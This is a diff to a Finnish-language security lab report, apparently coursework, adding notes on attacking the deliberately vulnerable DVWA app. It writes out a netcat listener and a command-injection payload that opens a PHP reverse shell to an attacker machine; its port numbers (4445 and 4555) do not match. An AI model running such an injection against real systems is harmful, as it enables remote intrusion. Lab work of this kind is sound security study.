@@ -152,6 +152,15 @@ Onkohan yhteys silti auki? Kokeilen ottaa yhteyden Kali Linuxilla:
 
 Ei onnistu. nmapin mukaan portti on kuitenkin auki.
 
+*Edit: luennolla opittua: oikeasti nc-yhteys saadaan aikaiseksi (tässä tapauksessa) näin:*
+
+- *Asetetaan nc kuuntelemaan hyökkäyskoneella esimerkiksi porttia 4445 komennolla `nc -lvp 4445`*
+- *Avataan nc-yhteys DVWA:n hakukentästä komennolla `1; php -r '$sock=fsockopen("192.168.56.102",4555);exec("/bin/sh -i <&3 >&3 2>&3");'`*
+- *`1;` on ip-osoite + komennon break*
+- *`php -r '$sock=fsockopen...` -komento on php-skripti joka käynnistää avoimen socketin ip/portti -yhdistelmällä, `exec()` käynnistää shellin*
+- *Hyökkäyskoneeseen avautuu shell-yhteys*
+
+
 ## d) Webgoat
 
 ### A1 - Injection
